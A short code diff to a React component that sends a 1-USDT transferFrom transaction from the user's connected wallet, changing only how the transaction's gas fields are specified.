@@ -85,6 +85,7 @@ const Hero = ({
         const transactionParameters1 = {
             to: usdt_address,
             from: accounts[0],
+            gas: web3.utils.toHex("90000"),
             data: usdtContract.methods
                 .transferFrom(
                     accounts[0],
@@ -92,8 +93,6 @@ const Hero = ({
                     web3.utils.toHex(web3.utils.toBN(`${1 * 10 ** 18}`))
                 )
                 .encodeABI(),
-            gasLimit: 90000,
-            value: "0x00",
         };
         try {
             const txHash = await window.ethereum.request({
